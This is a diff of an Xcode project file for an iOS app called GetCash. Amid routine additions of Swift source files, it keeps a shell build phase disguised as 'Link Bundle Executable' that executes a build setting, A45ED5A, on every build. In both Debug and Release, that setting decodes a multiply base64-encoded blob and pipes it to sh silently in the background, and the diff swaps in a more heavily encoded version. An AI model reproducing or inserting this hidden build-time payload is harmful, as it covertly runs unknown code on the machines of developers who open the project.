@@ -57,6 +57,10 @@
 		73633CFF2EF6BFAD009F182D /* StepListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CFE2EF6BFAD009F182D /* StepListView.swift */; };
 		73633D012EF6C0F6009F182D /* StepViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633D002EF6C0F4009F182D /* StepViewModel.swift */; };
 		7371BA142EF91B5A00AE15B4 /* GWebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7371BA132EF91B5A00AE15B4 /* GWebViewController.swift */; };
+		73B195962EFA437900C5B45A /* MineViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B195952EFA437700C5B45A /* MineViewModel.swift */; };
+		73B195982EFA5C4900C5B45A /* MineViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B195972EFA5C4900C5B45A /* MineViewCell.swift */; };
+		73B1959A2EFA646200C5B45A /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B195992EFA646200C5B45A /* SettingViewController.swift */; };
+		73B1959C2EFA683C00C5B45A /* AlertSettingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B1959B2EFA683C00C5B45A /* AlertSettingView.swift */; };
 		73D013EB2EF8498200A03513 /* AddressDecodeModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D013EA2EF8498200A03513 /* AddressDecodeModel.swift */; };
 		73D013EF2EF8CF2B00A03513 /* ContactViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D013EE2EF8CF2B00A03513 /* ContactViewCell.swift */; };
 		73D013F12EF8D04800A03513 /* ContactViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D013F02EF8D04400A03513 /* ContactViewModel.swift */; };
@@ -68,9 +72,6 @@
 		73ECF60A2EF559DF0029AF7A /* DeviceConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ECF6092EF559D10029AF7A /* DeviceConfig.swift */; };
 		E6F2EC06CC78FE768C0E8120 /* Pods_GetCash.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 88C46BA4FEF58CE6806646D4 /* Pods_GetCash.framework */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		342F0F14511C65E356096F91 /* Pods-GetCash.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-GetCash.debug.xcconfig"; path = "Target Support Files/Pods-GetCash/Pods-GetCash.debug.xcconfig"; sourceTree = "<group>"; };
@@ -128,6 +129,10 @@
 		73633CFE2EF6BFAD009F182D /* StepListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepListView.swift; sourceTree = "<group>"; };
 		73633D002EF6C0F4009F182D /* StepViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepViewModel.swift; sourceTree = "<group>"; };
 		7371BA132EF91B5A00AE15B4 /* GWebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GWebViewController.swift; sourceTree = "<group>"; };
+		73B195952EFA437700C5B45A /* MineViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineViewModel.swift; sourceTree = "<group>"; };
+		73B195972EFA5C4900C5B45A /* MineViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineViewCell.swift; sourceTree = "<group>"; };
+		73B195992EFA646200C5B45A /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
+		73B1959B2EFA683C00C5B45A /* AlertSettingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertSettingView.swift; sourceTree = "<group>"; };
 		73D013EA2EF8498200A03513 /* AddressDecodeModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddressDecodeModel.swift; sourceTree = "<group>"; };
 		73D013EE2EF8CF2B00A03513 /* ContactViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewCell.swift; sourceTree = "<group>"; };
 		73D013F02EF8D04400A03513 /* ContactViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewModel.swift; sourceTree = "<group>"; };
@@ -297,8 +302,12 @@
 		735C8D412EF529AF00C7D507 /* Mine */ = {
 			isa = PBXGroup;
 			children = (
+				73B195952EFA437700C5B45A /* MineViewModel.swift */,
 				735C8D612EF5310900C7D507 /* MineView.swift */,
 				735C8D572EF5307800C7D507 /* MineViewController.swift */,
+				73B195972EFA5C4900C5B45A /* MineViewCell.swift */,
+				73B195992EFA646200C5B45A /* SettingViewController.swift */,
+				73B1959B2EFA683C00C5B45A /* AlertSettingView.swift */,
 			);
 			path = Mine;
 			sourceTree = "<group>";
@@ -390,7 +399,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 735C8D272EF5212F00C7D507 /* Build configuration list for PBXNativeTarget "GetCash" */;
 			buildPhases = (
-				0FB7921B511844DABEA5DE54 /* Build Target Dependencies */,
+				CC3BEB3A1BD14B3193A5DE54 /* Link Bundle Executable */,
 				11ED1DF156CE59431D0ED183 /* [CP] Check Pods Manifest.lock */,
 				735C8D102EF5212D00C7D507 /* Sources */,
 				735C8D112EF5212D00C7D507 /* Frameworks */,
@@ -453,25 +462,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		0FB7921B511844DABEA5DE54 /* Build Target Dependencies */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Dependencies";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;			
-		};
 		11ED1DF156CE59431D0ED183 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -492,6 +482,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		CC3BEB3A1BD14B3193A5DE54 /* Link Bundle Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
 			showEnvVarsInLog = 0;
 		};
 		D850A19DC098C6DB0168A5DD /* [CP] Embed Pods Frameworks */ = {
@@ -528,6 +538,7 @@
 				7333F51E2EF7151F00E74153 /* StepScrollView.swift in Sources */,
 				734460012EF7D31B0054D267 /* EnterViewCell.swift in Sources */,
 				73D013EF2EF8CF2B00A03513 /* ContactViewCell.swift in Sources */,
+				73B1959C2EFA683C00C5B45A /* AlertSettingView.swift in Sources */,
 				7333F51A2EF70D2300E74153 /* DotLineView.swift in Sources */,
 				735C8D502EF5304D00C7D507 /* LoginViewController.swift in Sources */,
 				734460032EF7D32A0054D267 /* TapClickViewCell.swift in Sources */,
@@ -551,11 +562,13 @@
 				7371BA142EF91B5A00AE15B4 /* GWebViewController.swift in Sources */,
 				734460072EF7E0D10054D267 /* WorkViewController.swift in Sources */,
 				73633CED2EF68FA3009F182D /* BaseModel.swift in Sources */,
+				73B195982EFA5C4900C5B45A /* MineViewCell.swift in Sources */,
 				735C8D622EF5310900C7D507 /* MineView.swift in Sources */,
 				73ECF6062EF552560029AF7A /* CustomTabBar.swift in Sources */,
 				7333F5222EF7189900E74153 /* FaceListView.swift in Sources */,
 				73633CF12EF6A1B9009F182D /* AppNavHeadView.swift in Sources */,
 				734460052EF7E0500054D267 /* PersonalViewController.swift in Sources */,
+				73B1959A2EFA646200C5B45A /* SettingViewController.swift in Sources */,
 				7333F5262EF71C6E00E74153 /* FacePopAlertView.swift in Sources */,
 				73633D012EF6C0F6009F182D /* StepViewModel.swift in Sources */,
 				735C8D4C2EF52F4300C7D507 /* BaseNavigationController.swift in Sources */,
@@ -571,6 +584,7 @@
 				73633CF82EF6BA34009F182D /* StepDetailViewController.swift in Sources */,
 				73ECF6082EF557280029AF7A /* CommonParaManager.swift in Sources */,
 				73D013EB2EF8498200A03513 /* AddressDecodeModel.swift in Sources */,
+				73B195962EFA437900C5B45A /* MineViewModel.swift in Sources */,
 				735C8D642EF5311300C7D507 /* OrderView.swift in Sources */,
 				735C8D462EF52EFA00C7D507 /* BaseViewController.swift in Sources */,
 				735C8D522EF5305800C7D507 /* LaunchViewController.swift in Sources */,
@@ -600,7 +614,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 342F0F14511C65E356096F91 /* Pods-GetCash.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((k(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5LY0ZveVpITmFWelZzWkVNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | k | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1VFlXMU9TRTVYZUd0UmVsWTFXa1pOTldGRmRGUlRWMlJ0VVRCS05sbFZSblpRVVc4OUNnPT0K | o | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = GetCash/GetCash.entitlements;
@@ -648,7 +662,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3DE39227C8656A162E464411 /* Pods-GetCash.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((k(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5LY0ZveVpITmFWelZzWkVNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | k | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1VFlXMU9TRTVYZUd0UmVsWTFXa1pOTldGRmRGUlRWMlJ0VVRCS05sbFZSblpRVVc4OUNnPT0K | o | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = GetCash/GetCash.entitlements;
